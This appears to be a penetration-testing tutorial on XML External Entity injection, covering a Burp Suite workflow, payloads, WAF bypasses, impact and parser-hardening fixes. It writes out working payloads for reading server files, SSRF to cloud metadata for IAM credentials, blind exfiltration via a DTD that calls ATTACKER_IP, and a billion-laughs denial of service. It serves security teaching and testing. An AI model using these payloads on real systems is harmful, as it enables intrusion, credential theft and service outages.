XXE Injection

XML External Entity (XXE) injection allows attackers to read arbitrary files, perform SSRF attacks, or cause denial of service by exploiting how XML parsers process external entities. XXE is a critical vulnerability in any application that accepts XML input without proper validation.

Critical BSCP Intermediate

Real-World Analogy

The Fax Machine

Imagine a fax machine designed to receive and print documents. Normally, you send it a simple letter that says "Print this message." But one day, you send a fax with a cover sheet that includes instructions: "Before printing the letter, also fax me the contents of the file cabinet labeled /etc/passwd."

If the fax machine is poorly designed, it blindly follows every instruction in the document, including your embedded request. Instead of just printing your letter, it also retrieves and sends you sensitive files from the office server.

That's XXE in a nutshell: your XML document contains instructions (DOCTYPE declarations and entity definitions) that tell the parser to fetch and include other files or resources. If the parser isn't properly secured, it does exactly what you ask.

🎯 Day 4 · XXE Exploitation

Return to XML endpoints. Inject a DOCTYPE declaration and test for file read, then SSRF, then blind OOB. If the server returns the entity content in the response → classic XXE. If not → blind XXE with OOB (use interactsh for DNS callback).

<!-- File read XXE -->
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>

<!-- Blind OOB XXE -->
<!DOCTYPE root [<!ENTITY xxe SYSTEM "http://YOUR.interactsh.com/test">]>
<root>&xxe;</root>

<!-- SSRF via XXE -->
<!DOCTYPE root [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<root>&xxe;</root>

Chain it: XXE → SSRF → internal services → AWS metadata → IAM credentials. Or: XXE via SVG upload → read app config → find hardcoded secrets.

How It Works

XXE exploits the XML specification's support for external entities. Here's the attack chain:

  1. Identify XML input: Find an endpoint that accepts XML (POST body, file upload, SOAP service)
  2. Define external entity: Insert a DOCTYPE declaration with an ENTITY definition that references an external resource (local file, remote server)
  3. Reference the entity: Use the entity in the XML document (e.g., <value>&xxe;</value>)
  4. Parser processes entity: The XML parser resolves the external entity and includes its contents in the document
  5. Retrieve the data: The response includes the file contents or SSRF interaction result

The vulnerability exists because XML parsers have DOCTYPE processing enabled by default in many programming languages (Java, PHP, Python, C#). These parsers will fetch remote resources, read local files, or even process billion laughs DoS attacks.

Where to Look

XXE can appear in many contexts, not just obvious XML endpoints. Test these locations:

  • XML Content-Type endpoints: Any request with Content-Type: application/xml or text/xml
  • SOAP web services: WSDL endpoints, SOAP request bodies
  • File uploads: Files that may contain XML internally:
    • Microsoft Office files (.docx, .xlsx, .pptx · these are ZIP archives containing XML)
    • SVG images (SVG is XML-based)
    • PDF uploads (if processed server-side)
    • RSS/Atom feeds
  • JSON endpoints with XML support: Some APIs accept both JSON and XML. Try changing Content-Type to application/xml
  • API imports/data feeds: Any endpoint that imports or parses external data
  • WebDAV implementations: File management endpoints that may use XML
  • Configuration files: XML-based configuration uploads (e.g., Maven, Tomcat)

Burp Suite Workflow

1
Identify XML endpoint: Browse the application and find any request containing XML data. Use Burp's filter to search for requests containing < or ?xml. Right-click and send to Repeater.
2
Inject basic XXE payload: Before the root XML element, add a DOCTYPE declaration with an ENTITY definition. For example, if the request is <root><user>test</user></root>, change it to: 
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><user>&xxe;</user></root>
Send the request and check the response for file contents.
3
Test different file paths: If the basic payload works, try reading other sensitive files:
  • file:///etc/hostname (confirm arbitrary file read)
  • file:///c:/windows/win.ini (Windows systems)
  • file:///proc/self/environ (environment variables on Linux)
4
Test SSRF via XXE: Try making the parser fetch a URL instead of a local file: 
<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/admin">
This can access internal services (AWS metadata, admin panels, internal APIs).
5
Test blind XXE: If no output appears in the response, the XXE is still being processed but the output isn't returned. Use Burp Collaborator to detect out-of-band interaction: 
<!ENTITY xxe SYSTEM "http://YOUR_COLLABORATOR_URL">
This forces the parser to make an HTTP request to your Collaborator server, proving XXE processing even without visible output.
6
Exfiltrate data with blind XXE: If you can't see output directly but can trigger OOB interactions, use a parameter entity to exfiltrate data: 
<!DOCTYPE root [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://ATTACKER_SERVER/evil.dtd">
  %dtd;
]>
Host a DTD file on your server that processes %file and sends it to you.
7
Test file upload XXE: Upload an SVG, DOCX, or other XML-based file with embedded XXE payload. If the server parses it, you may achieve XXE without directly submitting XML.

Payloads & Techniques

Basic File Read (In-Band XXE)

The most straightforward XXE. The file contents appear in the response.

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>
  <data>&xxe;</data>
</root>

SSRF via XXE

Make the parser fetch a URL, allowing you to interact with internal services. Useful for scanning AWS metadata, accessing admin panels, or targeting localhost services.

<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<root><value>&xxe;</value></root>

Blind XXE with Out-of-Band (OOB) Detection

When output isn't visible in the response, use external interaction to prove the vulnerability. Requires Burp Collaborator or attacker-controlled server.

<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "http://burpcollaborator.net/UNIQUE_ID">]>
<root><value>&xxe;</value></root>

XXE with Parameter Entities (Blind Data Exfiltration)

Exfiltrate data from blind XXE using parameter entities and a custom DTD on your server.

Payload sent to target:

<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://ATTACKER_IP:PORT/exfil.dtd">
  %dtd;
]>
<root><value>&data;</value></root>

exfil.dtd on attacker server:

<!ENTITY % all "<!ENTITY &#x25; exfiltrate SYSTEM 'http://ATTACKER_IP:PORT/?data=%file;'>">
%all;

XXE in SVG File Upload

Many applications allow SVG uploads for image processing. SVG is XML-based and may be parsed server-side.

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
   <polygon points="1,1 1,50 50,50 50,1" fill="red"/>
   <![CDATA[<!ENTITY xxe SYSTEM "file:///etc/passwd">]]>
</svg>

XXE in Microsoft Office Document (.DOCX)

DOCX files are ZIP archives containing XML. Extract, modify, and repackage:

# Unzip the DOCX
unzip document.docx

# Edit document.xml to add XXE
# Repackage
zip -r document_evil.docx word/ _rels/ [Content_Types].xml

XInclude Attack (When DOCTYPE is Blocked)

If DOCTYPE processing is disabled, try XInclude instead. XInclude allows including external XML files within regular XML elements.

<?xml version="1.0"?>
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///etc/passwd"/>
</root>

Error-Based XXE (Information Disclosure via Error Messages)

Force an XML parse error that includes the file contents in the error message.

<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo><![CDATA[&xxe;]]></foo>

WAF Bypass Techniques

If basic XXE payloads are blocked, try these evasion techniques:

XML Encoding Variations

Encode the DOCTYPE or entity definition to bypass string-based WAF rules:

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>

Try changing encoding declaration to UTF-16 or UTF-32, which may bypass pattern-matching WAF rules that look for UTF-8 strings.

UTF-16 Encoding

FF FE 3C 3F 78 6D 6C ...  (UTF-16LE byte sequence)

Some WAFs check for "DOCTYPE" or "ENTITY" as plain text. UTF-16 encoding obfuscates these strings.

URL Encoding in Attribute Values

If the WAF blocks the literal word "file", try encoding it in various forms within the entity reference.

Case Variation

Some filters are case-sensitive. Try <!DOCTYPE>, <!Doctype>, <!doctype>, though most modern parsers normalize this.

Polyglot Attacks

If the endpoint accepts both XML and JSON, submit JSON with embedded XML:

{"data": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"}

Nested Entity Definition

Use parameter entities to define entities indirectly, potentially bypassing simple entity-name filters:

<!ENTITY % pe SYSTEM "file:///etc/passwd">
<!ENTITY send "%pe;">

Exploitation & Impact

Arbitrary File Read

The most direct impact: read sensitive files from the server. On Linux, target /etc/passwd, /etc/shadow (if running as root), application configuration files (database credentials, API keys), and source code. On Windows, read c:\windows\win.ini, registry hives, or application config files.

SSRF and Internal Network Scanning

Use XXE to make the server request URLs on the internal network. Scan for open ports on 127.0.0.1, enumerate AWS metadata (http://169.254.169.254/latest/meta-data/), or access internal admin panels. Blind XXE with timing attacks can even reveal service availability.

Denial of Service (Billion Laughs Attack)

Construct an XML payload with nested entity references that cause exponential expansion:

<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<lol>&lol3;</lol>

This causes the parser to consume massive amounts of memory and CPU, crashing the application.

Remote Code Execution (Rare, Indirect)

In very specific configurations, XXE can lead to RCE. For example, if a Java application uses an unsafe XSLT processor, you can use XXE to execute Java code. In PHP with certain extensions, external DTDs could be used to trigger code execution.

Blind XXE Data Exfiltration

Use parameter entities and a custom DTD to exfiltrate data even when you can't see the output directly. The server makes an HTTP request to your attacker-controlled server with the exfiltrated data encoded in the URL.

Remediation

XXE is fully preventable by properly configuring XML parsers. Here are the fixes:

Disable DOCTYPE Processing (Java)

DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);

Disable External Entities (Python)

from defusedxml import ElementTree as ET
tree = ET.parse('file.xml')  # Uses safe defaults by default

Disable External Entities (PHP)

libxml_disable_entity_loader(true);
$dom = new DOMDocument();
$dom->load('file.xml');

Disable External Entities (.NET)

XmlReaderSettings settings = new XmlReaderSettings();
settings.DtdProcessing = DtdProcessing.Prohibit;
settings.XmlResolver = null;
XmlReader reader = XmlReader.Create("file.xml", settings);

Use Safe XML Libraries

Prefer libraries designed for security by default: defusedxml (Python), Nokogiri with secure options (Ruby), or avoid XML parsing altogether if possible.

Prefer JSON Over XML

JSON doesn't support external entities. Migrating from XML to JSON eliminates the entire attack surface.

Input Validation

While not a replacement for proper parser configuration, validate that XML input doesn't contain DOCTYPE declarations or external entity definitions.

Set FEATURE_SECURE_PROCESSING

Some XML parsers support a secure processing flag that disables dangerous features:

dbf.setFeature("http://javax.xml.XMLConstants/feature/secure-processing", true);

Common Beginner Mistakes

Don't Fall Into These Traps
  • Assuming non-XML endpoints are safe: JSON endpoints sometimes accept XML if you change the Content-Type header. Always test.
  • Giving up when DOCTYPE is blocked: If DOCTYPE processing is disabled, try XInclude instead. Different parsing mechanisms can bypass individual filters.
  • Not testing blind XXE: Even if you see no output, the XXE is still being processed. Use Burp Collaborator to detect out-of-band interaction.
  • Ignoring file uploads: Office documents (DOCX, XLSX), PDFs, and SVGs contain XML internally. Upload handlers often parse this XML, making them XXE targets.
  • Not testing SSRF via XXE: XXE isn't just about reading files. Use it to scan internal networks, access metadata services, or interact with internal APIs.
  • Forgetting parameter entities: If basic entity definition doesn't work, try parameter entities (%entity;) which follow different parsing rules.
  • Testing only /etc/passwd: This file might not exist or might not be readable. Always test with files you can confirm exist (try /etc/hostname, /etc/os-release, or config files in common locations).
  • Not exfiltrating data in blind XXE: When you can't see output, don't assume failure. Use parameter entities and a custom DTD to exfiltrate data via HTTP requests to your server.

🔗 See Also · Attack Chains

XXE is a multi-tool · it can read files, probe internal services, and exfiltrate data out-of-band.

📡 SSRF XXE with an http:// entity URL is SSRF · it reaches internal services the attacker can't access directly. 📁 Path Traversal XXE file:// entities read arbitrary files on the server · equivalent to path traversal with full filesystem access. 📂 File Upload Upload an SVG or Office document with an XXE payload · the server-side parser fires the entity on processing. 📦 Deserialization Both involve the server processing a data format you control. Java apps with XML parsing often also deserialize objects.
